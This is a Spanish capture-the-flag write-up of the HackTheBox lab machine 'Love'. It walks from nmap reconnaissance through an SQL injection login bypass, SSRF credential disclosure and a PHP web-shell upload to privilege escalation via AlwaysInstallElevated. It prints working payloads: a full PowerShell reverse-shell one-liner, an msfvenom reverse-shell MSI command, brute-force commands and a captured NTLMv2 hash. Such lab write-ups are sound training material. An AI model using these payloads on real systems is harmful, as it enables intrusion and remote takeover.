# 10.10.10.239 - Love

![Love](https://user-images.githubusercontent.com/96772264/197388747-319cf1cf-6a22-4e92-aecf-e255da52f783.png)

-------------------

# Parte 1 - Reconocimiento

Tenemos abiertos los puertos: 80 (http) ,135(rpc),139(smb tambien),443,445(smb),3306(sql),5000,5040,5985,5986,7680

### Nmap -> escaneo de servicios

```sudo nmap -sCV -T5 -p443,445,3306,5000,5040,5985,5986,7680 10.10.10.239```
Las conclusiones que nos da Nmap son estas:
- El puerto 443 da error 403 Forbidden, pero es un Apache 2.4.46 con PHP 7.3.27.
- Tenemos el dominio staging.love.htb y la empresa se llama *ValentineCorp*
- Por smb tenemos que el sistema se llama LOVE y el Workgroup es WORKGROUP
- Puerto 5000, lo mismo que en el 443, error 403 y Apache 2.4.46/PHP 7.3.27.
 

### Puerto 80:
```console
└─$ whatweb http://10.10.10.239
http://10.10.10.239 [200 OK] Apache[2.4.46], Bootstrap, Cookies[PHPSESSID], OpenSSL/[1.1.1j] PHP[7.3.27], IP[10.10.10.239], JQuery, PasswordField[password], Script, Title[Voting System using PHP]
```
### Puerto 445 y 139:

No podemos acceder sin creds a ninguno.
```console
└─$ smbclient -L 10.10.10.239 -N 
session setup failed: NT_STATUS_ACCESS_DENIED
└─$ rpcclient -U "" 10.10.10.239 -N
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```
### Puerto 443 
La web da forbidden, pero al tener ssl ```openssl s_client -connect love.htb:443``` obtenemos el mail de ```roy@love.htb```  
```rpcclient -U "roy" 10.10.10.239 -N # NT_STATUS_LOGON_FAILURE```   
Pero intentar bruteforcear la contraseña no da resultado: ```crackmapexec smb 10.10.10.239 -u "roy" -p /usr/share/wordlists/rockyou.txt```  

-------------------------

# Parte 2: Explotación web

![lovehtb_1](https://user-images.githubusercontent.com/96772264/197388800-902b1bae-7d9a-4ee9-b064-95ab048cdd3a.PNG)


Como esto bien decia, la web http://10.10.10.239 / http://love.htb tiene el formulario este de "php voting system".  
Peticion -> ```POST a /login.php voter=123&password=123&login= PHPSESSID="8uonobi5kr3p0cvm2hir2o2g63" ``` 
Nos ha dado que "Cannot find voter with the ID" cosa que me incita a fuzzear este mismo.  

```console
└─$ hydra -L ./numbers.txt -p test love.htb https-post-form "/login.php:voter=^USER^&password=^PASS^:F=Cannot find voter with the ID" 
```
Pero tras un rato nada.  

En la seccion de comentarios hay ```<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->``` Pero la ruta "/js/Respond.js" da error 404.  

Como no he podido fuzzear el Voting System (y para la ruta staging tambien), queda buscarle en el searchsploit.  
```searchsploit Voting System``` Hay varios para autenticarse mediante SQLI, uno de ellos dice de poner.  
```admin:' or ''='``` a */admin* pero no dio resultado. En cambio otro mas largo (php/webapps/49483.txt) Si va:  
```login=yea&password=admin&username=dsfgdf' UNION SELECT 1,2,"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -```

Lo del medio que envia parece un formato de hash a juzgar por los "$". Una vez en la web del Voting system tenemos que el usaurio se llama "Neovic Devierte" 
(puede que nos sirva para los otros servicios).  

![lovehtb_2](https://user-images.githubusercontent.com/96772264/197388822-dfcecd45-a2bf-449d-b0dc-9a3128dcfebf.PNG)

Hay otro exploit (49486.txt) que habla de un file upload en /candidates.php, no esta nada sanitizado, pero si intento subir algo me da problemas con *Position*.     

![lovehtb_3](https://user-images.githubusercontent.com/96772264/197388834-55fac078-1160-46fb-90d0-008d2d35d63c.PNG)

En staging.love.htb hay un campo para peticiones. Si le pido que se la haga a mi servidor me responde  

![lovehtb_4](https://user-images.githubusercontent.com/96772264/197388841-1fa009bb-4a4f-401b-b5ba-febcf8b73caf.PNG)

```console
└─$ sudo python3 -m http.server   
[sudo] password for cucuxii:
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.239 - - [23/Oct/2022 10:56:37] "GET / HTTP/1.1" 200 -
10.10.10.239 - - [23/Oct/2022 10:59:11] "GET /shell.php HTTP/1.1" 200 -
```

Pero el php no lo interpreta.   
Si se lo pido al loscalhost me sale el formulatio del Voting System. Teniamos varias paginas Forbidden.  

La web del puerto 443 no me deja verla ```http://127.0.0.1:443 o https://127.0.0.1:443``` Pero la del 5000 si. Nos dan las creds "admin:@LoveIsInTheAir!!!!"  
Con el puerto 80 dichas creds nos llevan a la web de antes (que seguimos teniendo problema con subir el Candidato)  

![lovehtb_5](https://user-images.githubusercontent.com/96772264/197388860-915adddc-f7f3-4fc5-8ac4-f873ffa98392.PNG)

Tampoco nos sirven para el smb ni para admin ni para roy.  

En la web aparte de subir Candidatos puedes subir Votantes, ahí no hay ningun campo que nos de problemas.  
Subí el cmd.php y en la lista de Votantes me salió la foto (obviamente como es un shell.php no se muestra tal)  

![lovehtb6](https://user-images.githubusercontent.com/96772264/197388876-34ff9dc0-cad2-4dbe-9f14-9dcc5051c6ec.PNG)

-------------------------

# Parte 3: Accediendo al sistema

¿Pero donde está la backdoor? Como se subió en el campo de *foto*, al darle a *copy image location*   
```http://love.htb/images/shell.php?cmd=whoami```

Como tenemos ejecucion remota de comandos, ahora solo tenemos que ejecutar una reverse shell (y escuchar por netcat).  

La reverse shell seria esta:
```console
curl -s -X POST -d "powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.14.15%27%2C443%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22" http://gitserver.thm/web/exploit.php
```
Esto es la version urlencodeada de un [oneliner de powerhsell](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3):  
```powershell
*powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"*
```
Nos ponemos en escucha por el netcat.  
```console
└─$ sudo nc -nlvp 443
whoami
love\phoebe
PS C:\xampp\htdocs\omrs\images> 
```
```console
└─$ impacket-smbserver carpeta $(pwd) -smb2support
[*] Phoebe::LOVE:aaaaaaaaaaaaaaaa:f61b6d088db119ce592bb4d0a56f709b:010100000000000000718863cde6d8019d6b0265e2c0f8150000000001001000730065006a00720067004f004c006c0003001000730065006a00720067004f004c006c000200100053005200610071005900410051004d000400100053005200610071005900410051004d000700080000718863cde6d80106000400020000000800300030000000000000000000000000200000dc7b78e8b0b71bd6254ed079cc9343e57d00d68f7334579eb372fe74b4607ffe0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310035000000000000000000

PS C:\xampp\htdocs\omrs\images> copy \\10.10.14.15\carpeta\enumeracion_windows.bat . 
```
-------------------------

# Parte 4: Explotado Always Install Elevated

Nuestro [script](https://github.com/CUCUxii/win_enum/blob/main/enumeracion_windows.bat) nos dice que:  
- Usuarios: Administrator, Phoebe  
- El always Install elevated está activado 

La manera de explotar esto es:  
```console
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=666 -f msi -o reverse.msi
Saved as: reverse.msi
PS C:\xampp\htdocs\omrs\images> copy \\10.10.14.15\carpeta\reverse.msi .
msiexec /quiet /qn /i C:\xampp\htdocs\omrs\images\reverse.msi
└─$ sudo nc -nlvp 666
C:\WINDOWS\system32>whoami
whoami
nt authority\system
```

